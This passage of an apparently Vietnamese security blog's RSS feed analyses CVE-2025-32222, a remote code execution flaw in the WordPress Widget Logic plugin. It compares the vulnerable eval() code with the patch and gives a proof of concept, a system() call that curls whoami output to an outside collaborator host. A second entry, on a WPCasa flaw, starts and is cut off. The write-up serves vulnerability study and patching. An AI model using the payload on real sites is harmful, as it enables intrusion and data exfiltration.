eval ($logic); // @codingStandardsIgnoreLine - widget can&amp;#39;t work without eval&#xA;    } catch (Error $e) {&#xA;        trigger_error($e-&amp;gt;getMessage(), E_USER_WARNING); // @codingStandardsIgnoreLine - message is not dependent on user input&#xA;&#xA;        $show_widget = false;&#xA;    }&#xA;&#xA;    restore_error_handler();&#xA;&#xA;    return $show_widget;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;widget_logic_check_logic()&lt;/code&gt; s·ª≠ d·ª•ng &lt;code&gt;eval()&lt;/code&gt; ƒë·ªÉ th·ª±c thi tr·ª±c ti·∫øp chu·ªói logic do ng∆∞·ªùi d√πng cung c·∫•p, kh√¥ng gi·ªõi h·∫°n h√†m n√†o ƒë∆∞·ª£c g·ªçi. N·∫øu chu·ªói logic kh√¥ng ch·ª©a t·ª´ kh√≥a &lt;code&gt;return&lt;/code&gt;, h√†m s·∫Ω t·ª± ƒë·ªông b·ªçc n√≥ th√†nh m·ªôt c√¢u l·ªánh &lt;code&gt;return(...)&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o bi·ªÉu th·ª©c lu√¥n h·ª£p l·ªá khi &lt;code&gt;eval()&lt;/code&gt; th·ª±c thi. C∆° ch·∫ø n√†y gi√∫p ng∆∞·ªùi d√πng ch·ªâ c·∫ßn nh·∫≠p bi·ªÉu th·ª©c ƒëi·ªÅu ki·ªán ƒë∆°n gi·∫£n, nh∆∞ng ƒë·ªìng th·ªùi c≈©ng bi·∫øn m·ªçi input c·ªßa ng∆∞·ªùi d√πng th√†nh m√£ PHP ho√†n ch·ªânh, l√†m tƒÉng nguy c∆° &lt;strong&gt;th·ª±c thi m√£ t√πy √Ω (RCE)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v6.0.6):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_check_logic($logic)&#xA;{&#xA;    $allowed_functions = array(&#xA;        &amp;#39;is_home&amp;#39;, &amp;#39;is_front_page&amp;#39;, &amp;#39;is_single&amp;#39;, &amp;#39;is_page&amp;#39;, &amp;#39;is_category&amp;#39;,&#xA;        &amp;#39;is_tag&amp;#39;, &amp;#39;is_archive&amp;#39;, &amp;#39;is_search&amp;#39;, &amp;#39;is_404&amp;#39;, &amp;#39;is_user_logged_in&amp;#39;,&#xA;        &amp;#39;current_user_can&amp;#39;, &amp;#39;is_active_sidebar&amp;#39;, &amp;#39;is_admin&amp;#39;,&#xA;    );&#xA;&#xA;    $allowed_functions = apply_filters(&amp;#39;widget_logic_allowed_functions&amp;#39;, $allowed_functions);&#xA;&#xA;    $logic = trim((string) $logic);&#xA;    if (&amp;#39;&amp;#39; === $logic) {&#xA;        return true;&#xA;    }&#xA;&#xA;    // Set up error handling&#xA;    set_error_handler(&amp;#39;widget_logic_error_handler&amp;#39;, E_WARNING | E_USER_WARNING);  // @codingStandardsIgnoreLine - we need this for error handling&#xA;&#xA;    try {&#xA;        // Tokenize the logic string&#xA;        $tokens = widget_logic_tokenize($logic);&#xA;&#xA;        // Parse and evaluate the expression&#xA;        $pos = 0;&#xA;        $result = widget_logic_parse_expression($tokens, $pos, $allowed_functions);&#xA;&#xA;        // Check if there are any unexpected tokens after the expression&#xA;        if ($pos &amp;lt; count($tokens)) {&#xA;            throw new Exception(esc_html__(&amp;#39;Widget Logic: Unexpected tokens after expression.&amp;#39;, &amp;#39;widget-logic&amp;#39;));&#xA;        }&#xA;&#xA;        return (bool)$result;&#xA;    } catch (Exception $e) {&#xA;        widget_logic_error_handler(E_USER_WARNING, $e-&amp;gt;getMessage());&#xA;        return false;&#xA;    } finally {&#xA;        restore_error_handler();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/diff.png&#39; alt=&#34;Diff&#34; height=&#34;876&#34; width=&#34;1899&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ lo·∫°i b·ªè &lt;code&gt;eval()&lt;/code&gt;, thay b·∫±ng &lt;strong&gt;tokenizer v√† parser&lt;/strong&gt; ƒë·ªÉ ƒë√°nh gi√° logic, ch·ªâ cho ph√©p c√°c h√†m trong danh s√°ch &lt;strong&gt;whitelist&lt;/strong&gt;. N√≥ ki·ªÉm tra c√∫ ph√°p, ph√°t hi·ªán token d∆∞, x·ª≠ l√Ω l·ªói b·∫±ng &lt;code&gt;try/catch/finally&lt;/code&gt;, t·ª´ ƒë√≥ &lt;strong&gt;tƒÉng c∆∞·ªùng b·∫£o m·∫≠t&lt;/strong&gt; v√† ƒë·∫£m b·∫£o logic widget v·∫´n ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt filter hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter(&amp;#39;render_block&amp;#39;, &amp;#39;widget_logic_block_render&amp;#39;, 10, 2);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;render_block&lt;/code&gt;: hook filter c·ªßa WordPress, ƒë∆∞·ª£c g·ªçi m·ªói khi m·ªôt block (Gutenberg block) ƒë∆∞·ª£c render. T·ª©c khi post/page ƒë∆∞·ª£c t·∫°o, plugin s·∫Ω can thi·ªáp v√†o qu√° tr√¨nh render block v·ªõi callback &lt;code&gt;widget_logic_block_render&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_block_render($block_content, $block)&#xA;{&#xA;    if (!isset($block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;])) {&#xA;        return $block_content;&#xA;    }&#xA;&#xA;    return widget_logic_check_logic($block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;]) ? $block_content : &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;widget_logic_block_render&lt;/code&gt; s·∫Ω ki·ªÉm tra n·∫øu block kh√¥ng c√≥ attribute &lt;code&gt;widgetLogic&lt;/code&gt;, n√≥ s·∫Ω hi·ªÉn th·ªã b√¨nh th∆∞·ªùng. Attribute n√†y ƒë∆∞·ª£c th√™m v√†o th√¥ng qua &lt;strong&gt;Advanced Option&lt;/strong&gt; khi th√™m block.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#34; title=&#34;Widget Logic trong Advanced Option&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;Widget&lt;/h2&gt;&lt;p&gt;Widget Logic trong Advanced Option&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/widget.png&#39; alt=&#34;Widget&#34; height=&#34;622&#34; width=&#34;347&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget Logic trong Advanced Option&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;widget_logic_check_logic&lt;/code&gt; ƒë∆∞·ª£c g·ªçi N·∫øu block c√≥ attribute n√†y.&lt;/p&gt;&#xA;&lt;p&gt;L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi y√™u c·∫ßu ƒë·∫∑c quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; v√¨ ƒë√¢y l√† ƒë·∫∑c quy·ªÅn c√≥ th·ªÉ t·∫°o post v√† s·ª≠ d·ª•ng Widget Logic trong Advanced Option.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor creates/edits a Gutenberg block&amp;#34;] --&amp;gt; B[&amp;#34;Add widgetLogic value in Advanced Options&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Page/Post is rendered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;render_block filter is triggered&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;widget_logic_block_render() is called&amp;#34;]&#xA;&#xA;E --&amp;gt; F{&amp;#34;block[&amp;#39;attrs&amp;#39;][&amp;#39;widgetLogic&amp;#39;] exists?&amp;#34;}&#xA;F -- No --&amp;gt; G[&amp;#34;Render block normally&amp;#34;]&#xA;F -- Yes --&amp;gt; H[&amp;#34;Pass widgetLogic to widget_logic_check_logic()&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Normalize &amp;amp; wrap logic with return(...) if needed&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Execute logic using eval()&amp;#34;]&#xA;&#xA;J --&amp;gt; K{&amp;#34;Result = true ?&amp;#34;}&#xA;K -- Yes --&amp;gt; L[&amp;#34;Block content is displayed&amp;#34;]&#xA;K -- No --&amp;gt; M[&amp;#34;Block is hidden (empty)&amp;#34;]&#xA;&#xA;J --&amp;gt; N{&amp;#34;Malicious code injected?&amp;#34;}&#xA;N -- Yes --&amp;gt; O[&amp;#34;Arbitrary PHP code executed (RCE)&amp;#34;]&#xA;&#xA;L --&amp;gt; Z[&amp;#34;End&amp;#34;]&#xA;M --&amp;gt; Z&#xA;O --&amp;gt; Z&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;ƒêƒÉng nh·∫≠p v·ªõi user &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o post, th√™m m·ªôt block b·∫•t k√¨ v√† th√™m payload v√†o &lt;strong&gt;Widget Logic&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;system(&amp;#39;curl http://929topgvyzo9d93rxe1xpxcriio9cz0o.oastify.com/?leadked=$(whoami)&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-30-cve-2025-32222/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-30-cve-2025-32222/result.png&#39; alt=&#34;Result&#34; height=&#34;582&#34; width=&#34;1131&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE‚Äë2025‚Äë32222 b·∫Øt ngu·ªìn t·ª´ vi·ªác &lt;strong&gt;s·ª≠ d·ª•ng &lt;code&gt;eval()&lt;/code&gt; tr√™n d·ªØ li·ªáu do ng∆∞·ªùi d√πng ki·ªÉm so√°t&lt;/strong&gt; trong &lt;code&gt;widget_logic_check_logic()&lt;/code&gt;. Ch·ªâ v·ªõi quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt;, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n logic ƒë·ªôc h·∫°i v√†o thu·ªôc t√≠nh &lt;code&gt;widgetLogic&lt;/code&gt; c·ªßa block, khi·∫øn m√£ PHP t√πy √Ω ƒë∆∞·ª£c th·ª±c thi trong qu√° tr√¨nh &lt;code&gt;render_block&lt;/code&gt;. C∆° ch·∫ø t·ª± ƒë·ªông b·ªçc &lt;code&gt;return(...)&lt;/code&gt; c√†ng l√†m vi·ªác khai th√°c d·ªÖ d√†ng h∆°n v√¨ m·ªçi chu·ªói nh·∫≠p v√†o cu·ªëi c√πng ƒë·ªÅu tr·ªü th√†nh m√£ PHP h·ª£p l·ªá. B·∫£n v√° 6.0.6 ƒë√£ x·ª≠ l√Ω tri·ªát ƒë·ªÉ b·∫±ng c√°ch lo·∫°i b·ªè &lt;code&gt;eval()&lt;/code&gt;, d√πng c∆° ch·∫ø &lt;strong&gt;tokenize + parse + allowlist&lt;/strong&gt;, t·ª´ ƒë√≥ ch·∫∑n ho√†n to√†n kh·∫£ nƒÉng th·ª±c thi m√£ t√πy √Ω.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù s·ª≠ d·ª•ng &lt;code&gt;eval()&lt;/code&gt; v·ªõi d·ªØ li·ªáu ƒë·∫øn t·ª´ ng∆∞·ªùi d√πng, k·ªÉ c·∫£ ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn th·∫•p h∆°n admin.&lt;/li&gt;&#xA;&lt;li&gt;C√°c bi·ªÉu th·ª©c logic n√™n ƒë∆∞·ª£c x·ª≠ l√Ω b·∫±ng &lt;strong&gt;parser ri√™ng + whitelist h√†m h·ª£p l·ªá&lt;/strong&gt;, kh√¥ng ph·∫£i th·ª±c thi tr·ª±c ti·∫øp.&lt;/li&gt;&#xA;&lt;li&gt;D·ªØ li·ªáu g·∫Øn v√†o block (block attributes) v·∫´n l√† &lt;strong&gt;user input&lt;/strong&gt; v√† ph·∫£i ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t ch·∫Ω.&lt;/li&gt;&#xA;&lt;li&gt;Ch·ªâ c·∫ßn quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt; c≈©ng c√≥ th·ªÉ g√¢y ra &lt;strong&gt;RCE nghi√™m tr·ªçng&lt;/strong&gt; n·∫øu c∆° ch·∫ø ki·ªÉm so√°t ƒë·∫ßu v√†o sai.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác thay th·∫ø &lt;code&gt;eval()&lt;/code&gt; b·∫±ng c√°ch ti·∫øp c·∫≠n ph√¢n t√≠ch c√∫ ph√°p an to√†n l√† h∆∞·ªõng ƒëi ƒë√∫ng cho c√°c plugin x·ª≠ l√Ω ‚Äúlogic ng∆∞·ªùi d√πng‚Äù.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/widget-logic/vulnerability/wordpress-widget-logic-6-0-5-remote-code-execution-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin &amp;lt;= 6.0.5 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9321 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-28-cve-2025-9321/</link>
      <pubDate>Fri, 28 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-28-cve-2025-9321/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin WPCasa cho WordPress d·ªÖ b·ªã t·∫•n c√¥ng Code Injection trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn v√† bao g·ªìm 1.4.1. Nguy√™n nh√¢n l√† do vi·ªác x√°c th·ª±c v√† gi·ªõi h·∫°n ƒë·∫ßu v√†o kh√¥ng ƒë·∫ßy ƒë·ªß trong h√†m &lt;code&gt;&#39;api_requests&#39;&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ g·ªçi c√°c h√†m t√πy √Ω v√† th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9321&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9321&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.4.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.4.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wpcasa/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WPCasa Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a 